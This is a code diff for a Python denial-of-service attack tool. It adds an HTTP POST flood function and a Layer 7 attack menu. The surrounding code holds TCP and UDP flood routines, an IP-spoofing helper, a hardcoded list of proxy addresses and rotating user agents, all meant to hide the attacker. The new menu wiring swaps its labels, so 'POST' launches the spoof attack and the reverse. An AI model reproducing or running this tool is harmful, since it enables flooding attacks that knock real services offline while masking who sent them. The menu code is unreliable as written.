@@ -6,18 +6,20 @@ from colorama import Fore, init
 import requests
 from urllib.parse import urlparse
 
-
+# Initialize colorama
 init(autoreset=True)
 
-
+# List of user-agents for anonymity
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/99.0.2",
-    
+    # Add more user-agents as needed
 ]
 
-
+# Secure and anonymize the proxy list (store it in a secure location)
+# Define a list of proxy tuples (host, port)
 proxies = [
+    # Replace with secure and anonymous proxy details
     ("185.64.208.168", 53281),
     ("125.60.148.161", 111),
     ("137.188.108.18", 4000),
@@ -47,7 +49,7 @@ proxies = [
     ("50.228.83.226", 80)
 ]
 
-
+# Define a function to fetch proxy list securely (if needed)
 def fetch_proxies():
     try:
         response = requests.get("https://example.com/secure-proxy-list")
@@ -59,7 +61,7 @@ def fetch_proxies():
         print("Error fetching proxy list:", e)
     return []
 
-
+# Function to generate a spoofed IP address
 def spoofer():
     addr = [192, 168, 0, 1]
     d = '.'
@@ -70,7 +72,7 @@ def spoofer():
     assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
     return assembled
 
-
+# Function for DDoS TCP Flood
 def ddos_tcp_flood(ip, port):
     # Implement security checks and input validation here
     packets = int(input('[+] Packets per Thread: '))
@@ -96,7 +98,7 @@ def ddos_tcp_flood(ip, port):
         thread = threading.Thread(target=start_attack)
         thread.start()
 
-
+# Function for DDoS UDP Flood
 def ddos_udp_flood(ip, port):
     length = int(input('Duration (in seconds): '))
     num_threads = int(input('Number of Threads: '))
@@ -106,7 +108,7 @@ def ddos_udp_flood(ip, port):
         duration = time.time() + length
         print(f'UDP Flood: {ip}:{port} for {length} seconds with {num_threads} threads')
 
-        
+        # Create a list to store thread objects
         threads = []
 
         for _ in range(num_threads):
@@ -114,7 +116,7 @@ def ddos_udp_flood(ip, port):
             threads.append(thread)
             thread.start()
 
-        
+        # Wait for all threads to complete
         for thread in threads:
             thread.join()
 
@@ -136,7 +138,7 @@ def ddos_udp_flood(ip, port):
 
     UDPFlood()
 
-
+# Function for HTTPS-SPOOF Attack
 def https_spoof_attack(url, timer):
     headers = {
         "User-Agent": random.choice(user_agents),  # Select a random user-agent for anonymity
@@ -149,7 +151,8 @@ def https_spoof_attack(url, timer):
         "Connection": "Keep-Alive"
     }
 
-    
+    # Secure and anonymize the proxy list (store it in a secure location)
+    # Define a list of proxy dictionaries (scheme, host, port)
     
 
     proxies = [
@@ -193,7 +196,32 @@ def https_spoof_attack(url, timer):
         except Exception as e:
             print(f"Failed to send request: {str(e)}")
 
+def layer7_post_attack(url, timer):
+    headers = {
+        "User-Agent": random.choice(user_agents),  # Select a random user-agent for anonymity
+        "X-Requested-With": "XMLHttpRequest",
+        "Content-Type": "application/json",
+    }
 
+    timeout = time.time() + int(timer)
+    num_requests = int(input('[+] Number of Requests: '))  # Input the number of requests
+
+    def send_request():
+        try:
+            response = requests.post(url, headers=headers)
+            if response.status_code == 200:
+                print(f"Sent POST request to {url} - Status Code: {response.status_code}")
+            else:
+                print(f"Request failed with status code: {response.status_code}")
+        except Exception as e:
+            print(f"Failed to send POST request: {str(e)}")
+
+    while time.time() < timeout:
+        for _ in range(num_requests):
+            send_request()
+
+            
+# Main method panel
 def main_panel():
     home_banner = """
   _____ ______ _____ _____ _______  _______  __    ______     ____  ____       _____
@@ -246,16 +274,22 @@ ___/ / /___/  /_/ /___/ // // /  / / / __/ /___/ /__/_____/ /_/ / /_/ / /_/ /__/
             else:
                 print("Invalid Layer 4 choice. Please select a valid option.")
 
-        elif choice == '2':  # Option for Layer 7 (HTTPS-SPOOF)
-            url = input('Target URL (e.g., https://example.com/): ')
-            timer = input('Attack Duration (in seconds): ')
-            https_spoof_attack(url, timer)
+        if choice == '2':  # Option for Layer 7
+            print(Fore.RED + layer7_banner)
+            print(Fore.RED + "[1] POST")
+            print(Fore.RED + "[2] HTTPS-SPOOF")
+            layer7_choice = input(Fore.WHITE + "Choose Layer 7 Method: ")
 
-        elif choice == '3':
-            print("Exiting...")
-            break
-        else:
-            print("Invalid choice. Please select a valid option.")
+            if layer7_choice == '1':
+                url = input('Target URL (e.g., https://example.com/): ')
+                timer = input('Attack Duration (in seconds): ')
+                https_spoof_attack(url, timer)
+            elif layer7_choice == '2':
+                url = input('Target URL (e.g., https://example.com/): ')
+                timer = input('Attack Duration (in seconds): ')
+                layer7_post_attack(url, timer)  # Execute Layer 7 HTTP POST Attack
+            else:
+                print("Invalid Layer 7 choice. Please select a valid option.")
 
 if __name__ == "__main__":
     main_panel()
